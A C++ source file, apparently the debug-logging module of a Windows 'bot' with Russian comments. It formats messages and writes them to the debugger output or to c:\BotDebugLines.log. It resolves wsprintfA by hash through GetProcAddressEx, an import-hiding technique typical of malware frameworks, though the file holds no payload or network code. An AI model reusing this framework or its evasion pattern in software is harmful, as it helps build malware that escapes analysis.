//---------------------------------------------------------------------------
#include <windows.h>

#include "GetApi.h"
#include "BotDebug.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"

//---------------------------------------------------------------------------

DWORD HandlerPID = 0;
LPVOID DebugMsgHandler = NULL;
TDebugMessageHandlerMethod DebugMsgHandlerHandlerMethod;

// Установить обработчик отладочных строк
void SetDebugMessageHandler(LPVOID Handler, TDebugMessageHandlerMethod Method)
{
	IsNewProcess(HandlerPID);
	DebugMsgHandler = Handler;
    DebugMsgHandlerHandlerMethod = Method;
}

#ifdef DEBUGBOT

PCHAR StartDebugMSG = "Бот запущен в отладочном режиме! Продолжить?";

bool StartInDebugingMode(bool ShMSG)
{
	if (ShMSG)
	{
		int R = (int)pMessageBoxA(0, StartDebugMSG, NULL, MB_YESNO | MB_SERVICE_NOTIFICATION );
		if (R != IDYES)
			return false;
	}

	return true;
}

#endif

/* void DebugMessage(PCHAR Msg)
{
	// Вывести сообщение
	pMessageBoxA(0, Msg, NULL, MB_OK);
}
*/


#ifdef OUTPUT_LINES_IN_FILE

	const char DebugLinesFileName[] = "c:\\BotDebugLines.log";

	HANDLE OpenDebugFile(PCHAR FileName)
	{
		// Функция открывает файл для записи и смещает указатель в
		// конец файла
		if (STR::IsEmpty(FileName))
			return NULL;

		HANDLE File = NULL;
		DWORD Start = (DWORD)pGetTickCount();
		bool Continue = false;
		do
		{
			File = pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
										OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

			if (File != INVALID_HANDLE_VALUE)
				return File;


			if (pGetLastError() == ERROR_SHARING_VIOLATION)
			{
				if ((DWORD)pGetTickCount() - Start >= 2000)
					return NULL;
				else
					pSleep(10);
			}
		}
		while (1);

        return NULL;
	}


	void OutputDebugStringInFileA(PCHAR Line)
	{
		// Функция выводит отладочную строку в файл
		HANDLE File = OpenDebugFile((PCHAR)DebugLinesFileName);
		if (File == NULL)
			return;

		pSetFilePointer(File, 0, 0, FILE_END);


		DWORD Writed = NULL;
		pWriteFile(File, Line, StrCalcLength(Line), &Writed, NULL);
		pWriteFile(File, "\r\n", 2, &Writed, NULL);


        pCloseHandle(File);
	}

#endif


void Debug::MessageEx(PCHAR Module, DWORD Line, PCHAR Section, PCHAR ExtData, PCHAR Str, ...)
{
	// Вызвать отладочное сообщение
	PCHAR FullLine = STR::Alloc(StrCalcLength(Str) + 4096);

	va_list Arguments;
	va_start(Arguments, Str);
	pwvsprintfA(FullLine, Str, Arguments);
	va_end(Arguments);


	if (IsNewProcess(HandlerPID))
	{
		DebugMsgHandler = NULL;
		DebugMsgHandlerHandlerMethod = NULL;
	}

	if (DebugMsgHandlerHandlerMethod != NULL)
	{
		DebugMsgHandlerHandlerMethod(DebugMsgHandler, Module, Line, Section, ExtData, FullLine);
		STR::Free(FullLine);
		return;
	}

	PCHAR ExtLine = STR::Alloc(STR::Length(FullLine) + 512);


	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _wsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7);

	_wsprintfA(ExtLine, "%s(%d) [ %s ] : %s", Module, Line, Section, FullLine);

	#ifdef OUTPUT_LINES_IN_FILE
		OutputDebugStringInFileA(ExtLine);
	#else
		pOutputDebugStringA(ExtLine);
	#endif
	STR::Free(FullLine);
    STR::Free(ExtLine);
}

void Debug::Message(PCHAR Module, PCHAR Str)
{
	MessageEx(Module, 0, NULL, NULL, Str);
}